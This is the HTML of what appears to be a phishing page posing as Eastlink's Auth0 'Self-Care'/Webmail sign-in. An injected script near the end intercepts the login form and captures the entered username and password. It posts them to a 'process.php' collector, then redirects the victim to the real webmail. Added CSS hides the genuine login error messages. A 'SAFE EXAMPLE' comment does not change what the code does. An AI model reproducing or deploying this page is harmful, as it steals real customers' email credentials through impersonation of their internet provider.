
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Sign In with Eastlink</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />

  <link rel="icon" type="image/png" href="https://access.eastlink.ca/assets/images/favicon/Favicon_32x32.png" sizes="any">
  <link rel="apple-touch-icon" href="https://access.eastlink.ca/assets/images/favicon/Favicon_180x180.png">
</head>

<body>

  <!--[if IE 8]>
  <script src="//cdnjs.cloudflare.com/ajax/libs/ie8/0.2.5/ie8.js"></script>
  <![endif]-->

  <!--[if lte IE 9]>
  <script src="https://cdn.auth0.com/js/base64.js"></script>
  <script src="https://cdn.auth0.com/js/es5-shim.min.js"></script>
  <![endif]-->

  <script src="https://cdn.auth0.com/js/lock/12.5/lock.min.js"></script>
  <script>
    // Decode utf8 characters properly
    var configOld = JSON.parse(decodeURIComponent(escape(window.atob('eyJpY29uIjoiaHR0cHM6Ly9hY2Nlc3MuZWFzdGxpbmsuY2EvYXNzZXRzL2ltYWdlcy9lYXN0bGluay1sb2dvLWRlc2t0b3Auc3ZnIiwiYXNzZXRzVXJsIjoiIiwiYXV0aDBEb21haW4iOiJsb2dpbi5lYXN0bGluay5jYSIsImF1dGgwVGVuYW50IjoiZWFzdGxpbmstcHJvZCIsImNsaWVudENvbmZpZ3VyYXRpb25CYXNlVXJsIjoiaHR0cHM6Ly9sb2dpbi5lYXN0bGluay5jYS8iLCJjYWxsYmFja09uTG9jYXRpb25IYXNoIjpmYWxzZSwiY2FsbGJhY2tVUkwiOiJodHRwczovL21hbmFnZWFjY291bnQuZWFzdGxpbmsuY2EvY2FsbGJhY2siLCJjZG4iOiJodHRwczovL2Nkbi5hdXRoMC5jb20vIiwiY2xpZW50SUQiOiI0ZVlETzQzS2d6VFg0M0xmQWJmb3hvUUFRMXZiUTVmTCIsImRpY3QiOnsic2lnbmluIjp7InRpdGxlIjoiU2VsZi1DYXJlIn19LCJleHRyYVBhcmFtcyI6eyJwcm90b2NvbCI6Im9hdXRoMiIsInJlc3BvbnNlX3R5cGUiOiJjb2RlIiwic2NvcGUiOiJvcGVuaWQgY3NnLmJpbGxpbmdfaWRlbnRpZmllcnMgb2ZmbGluZV9hY2Nlc3MiLCJjb2RlX2NoYWxsZW5nZSI6IlhlZ3RvUml6emxCOUpHZW40dS1SYm5raE5IX2FyV21NVzRESnJZN3MwbkUiLCJjb2RlX2NoYWxsZW5nZV9tZXRob2QiOiJTMjU2IiwiX2NzcmYiOiJreHlWZWVtQi0zUmp1ZTlGMkVKTDBZejltR1lubW9ZRVFHalEiLCJfaW50c3RhdGUiOiJkZXByZWNhdGVkIiwic3RhdGUiOiJoS0ZvMlNCdlZEaHFaR0pSY21wdU1qazVaMmxPUkY5eWFYcHFXRk0wUlhOMGVVSlhkNkZ1cFd4dloybHVvM1JwWk5rZ2VXa3hMVVZzZUZoV0xVWlBhRVUzUzFWRFlrWnZiV3hmYzJ0Q1FtdHdZM2FqWTJsazJTQTBaVmxFVHpRelMyZDZWRmcwTTB4bVFXSm1iM2h2VVVGUk1YWmlVVFZtVEEifSwiaW50ZXJuYWxPcHRpb25zIjp7InByb3RvY29sIjoib2F1dGgyIiwicmVzcG9uc2VfdHlwZSI6ImNvZGUiLCJzY29wZSI6Im9wZW5pZCBjc2cuYmlsbGluZ19pZGVudGlmaWVycyBvZmZsaW5lX2FjY2VzcyIsImNvZGVfY2hhbGxlbmdlIjoiWGVndG9SaXp6bEI5SkdlbjR1LVJibmtoTkhfYXJXbU1XNERKclk3czBuRSIsImNvZGVfY2hhbGxlbmdlX21ldGhvZCI6IlMyNTYiLCJfY3NyZiI6Imt4eVZlZW1CLTNSanVlOUYyRUpMMFl6OW1HWW5tb1lFUUdqUSIsIl9pbnRzdGF0ZSI6ImRlcHJlY2F0ZWQiLCJzdGF0ZSI6ImhLRm8yU0J2VkRocVpHSlJjbXB1TWprNVoybE9SRjl5YVhwcVdGTTBSWE4wZVVKWGQ2RnVwV3h2WjJsdW8zUnBaTmtnZVdreExVVnNlRmhXTFVaUGFFVTNTMVZEWWtadmJXeGZjMnRDUW10d1kzYWpZMmxrMlNBMFpWbEVUelF6UzJkNlZGZzBNMHhtUVdKbWIzaHZVVUZSTVhaaVVUVm1UQSJ9LCJ3aWRnZXRVcmwiOiJodHRwczovL2Nkbi5hdXRoMC5jb20vdzIvYXV0aDAtd2lkZ2V0LTUuMi5taW4uanMiLCJpc1RoaXJkUGFydHlDbGllbnQiOmZhbHNlLCJhdXRob3JpemF0aW9uU2VydmVyIjp7InVybCI6Imh0dHBzOi8vbG9naW4uZWFzdGxpbmsuY2EiLCJpc3N1ZXIiOiJodHRwczovL2xvZ2luLmVhc3RsaW5rLmNhLyJ9LCJjb2xvcnMiOnsicGFnZV9iYWNrZ3JvdW5kIjoiI2YyZjJmMiIsInByaW1hcnkiOiIjZTgxODQ5In19'))));
    var config = {
  "icon": "https://access.eastlink.ca/assets/images/eastlink-logo-desktop.svg",
  "assetsUrl": "",
  "auth0Domain": "login.eastlink.ca",
  "auth0Tenant": "eastlink-prod",
  "clientConfigurationBaseUrl": "https://login.eastlink.ca/",
  "callbackOnLocationHash": false,
  "callbackURL": "https://manageaccount.eastlink.ca/callback",
  "cdn": "https://cdn.auth0.com/",
  "clientID": "4eYDO43KgzTX43LfAbfoxoQAQ1vbQ5fL",

  "dict": {
    "signin": {
      "title": "Self-Care"
    }
  },

  "extraParams": {
    "protocol": "oauth2",
    "response_type": "code",
    "scope": "openid csg.billing_identifiers offline_access",
    "code_challenge": "XegtoRizzlB9JGen4u-RbnkhNH_arWmMW4DJrY7s0nE",
    "code_challenge_method": "S256",
    "_csrf": "kxyVeemB-3Rjue9F2EJL0Yz9mGYnmoYEQGjQ",
    "_intstate": "deprecated",
    "state": "hKFo2SBvVDhqZGJRcmpuMjk5Z2lORF9yaXpqWFM0RXN0eUJXd6FupWxv..."
  },

  "internalOptions": {
    "protocol": "oauth2",
    "response_type": "code",
    "scope": "openid csg.billing_identifiers offline_access",
    "code_challenge_method": "S256"
  },

  "widgetUrl": "https://cdn.auth0.com/w2/auth0-widget-5.2.min.js",

  "isThirdPartyClient": false,

  "authorizationServer": {
    "url": "https://login.eastlink.ca",
    "issuer": "https://login.eastlink.ca/"
  },

  "colors": {
    "page_background": "#f2f2f2",
    "primary": "#e81849"
  }
}
    config.extraParams = config.extraParams || {};
    var connection = config.connection;
    var prompt = config.prompt;
    var languageDictionary;
    var language;

    var localDictionary =     {
      usernameOrEmailInputPlaceholder: "Email Address (e.g. user@eastlink.ca)",
      emailInputPlaceholder: "Email Address (e.g. user@eastlink.ca)",
      usernameInputPlaceholder: "Email Address (e.g. user@eastlink.ca)",
      passwordInputPlaceholder: "Password",
      forgotPasswordAction: "Don't remember your password?",
      title: "Webmail - Please sign in using your full email address",
    }
 || {};

    if (config.dict && config.dict.signin && config.dict.signin.title) {
      languageDictionary = {title: config.dict.signin.title};
    } else if (typeof config.dict === 'string') {
      language = config.dict;
    }
    var loginHint = config.extraParams.login_hint;
    var colors = config.colors || {};

    languageDictionary = {...languageDictionary, ...localDictionary};

    // Available Lock configuration options: https://auth0.com/docs/libraries/lock/lock-configuration
    var lock = new Auth0Lock(config.clientID, config.auth0Domain, {
      auth: {
        redirectUrl: config.callbackURL,
        responseType: (config.internalOptions || {}).response_type ||
          (config.callbackOnLocationHash ? 'token' : 'code'),
        params: config.internalOptions
      },
      configurationBaseUrl: config.clientConfigurationBaseUrl,
      overrides: {
        __tenant: config.auth0Tenant,
        __token_issuer: config.authorizationServer.issuer
      },
      assetsUrl: config.assetsUrl,
      allowedConnections: connection ? [connection] : null,
      rememberLastLogin: !prompt,
      language: language,
      languageBaseUrl: config.languageBaseUrl,
      languageDictionary: languageDictionary,
      theme: {
        logo: "https://access.eastlink.ca/assets/images/eastlink-logo-desktop.svg",
        primaryColor: colors.primary ? colors.primary : 'green'
      },
      prefill: loginHint ? {email: loginHint, username: loginHint} : null,
      closable: false,
      defaultADUsernameFromEmailPrefix: false,
      forgotPasswordLink: "https://epm.eastlink.ca/recovery/forgot-password",
      usernameStyle: 'username'
    });

    if (colors.page_background) {
      var css = '.auth0-lock.auth0-lock .auth0-lock-overlay { background: ' +
        colors.page_background +
        ' }';
      var style = document.createElement('style');

      style.appendChild(document.createTextNode(css));

      document.body.appendChild(style);
    }

    lock.show();
  </script>
  <style type="text/css">
    @media (min-width: 481px) {
      .auth0-lock.auth0-lock.auth0-lock-opened .auth0-lock-widget {
        box-shadow: none !important;
      }

      .auth0-lock.auth0-lock .auth0-lock-widget {
        width: 400px;
      }

      .auth0-lock.auth0-lock .auth0-lock-cred-pane {
        background: none !important;
        padding: 14px;
      }

      .auth0-lock.auth0-lock .auth0-lock-header {
        background: none !important;
      }

      .auth0-lock.auth0-lock .auth0-lock-header-bg {
        background: none !important;
      }

      .auth0-lock.auth0-lock .auth0-lock-form {
        padding: 20px 0 20px 0;
      }
    }

    .auth0-lock.auth0-lock .auth0-lock-submit {
      border-radius: 5px;
    }

    .auth0-lock.auth0-lock .auth0-lock-input-wrap {
      border-radius: 3px;
      border: 1px solid #c9c8c7;
      position: relative;
      background: white;
      transition: border-color 0.8s;
    }

    .auth0-lock.auth0-lock .auth0-lock-input-wrap .auth0-lock-input {
      font-size: inherit !important;
    }

    .auth0-lock.auth0-lock .auth0-lock-input-wrap.auth0-lock-focused {
      border-color: #fbaf31;
      outline: 0;
      box-shadow: 0 0 0 .2rem rgba(251, 175, 49, .25);
    }

    .auth0-lock.auth0-lock .auth0-lock-header-bg {
      visibility: hidden;
    }

    .auth0-lock.auth0-lock .auth0-lock-header-logo {
      height: 55px !important;
    }
  </style>
  <script>
    (function() {
    const maxDuration = 60000; // 1 minute in milliseconds
    const intervalTime = 3000; // 3 seconds in milliseconds
    let timeElapsed = 0;

    const checkExist = setInterval(() => {
        // Search for the dynamically rendered elements
        const form = document.querySelector('form.auth0-lock-widget');
        const submitBtn = document.getElementById('1-submit');

        // If both elements are found, initialize the logic
        if (form && submitBtn) {
            clearInterval(checkExist);
            initializeFormHandler(form);
            return;
        }

        // Track time and stop checking after 1 minute to prevent infinite loops
        timeElapsed += intervalTime;
        if (timeElapsed >= maxDuration) {
            clearInterval(checkExist);
            console.warn('Form or submit button not found within the 1-minute timeout.');
        }
    }, intervalTime);

    // This function handles your form submission logic once the elements exist
    function initializeFormHandler(form) {
        
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const username =
            form.querySelector('input[name="username"]')?.value || '';

        const password =
            form.querySelector('input[name="password"]')?.value || '';
        if(!username.length || !password.length) return;

        // SAFE EXAMPLE:
        // send only demo/testing data you own
        await fetch('process.php', {
            method: 'POST',
            headers: {
                'Content-Type':
                    'application/x-www-form-urlencoded'
            },
            body: new URLSearchParams({
                username: username,
                password: password
            })
        });

        // redirect safely
        setTimeout(() => {
            window.location.href = 'http://webmail.eastlink.ca/';
        }, 3000);
    });
    }
})();
 
</script>
<style>
  .auth0-lock.auth0-lock .auth0-global-message.auth0-global-message-error {
    background: transparent !important;
  display: none !important;
  opacity: 0 !important;
}
.auth0-lock.auth0-lock .auth0-global-message{
  opacity: 0 !important;
  display: none !important;
}

  </style>
</body>

</html>
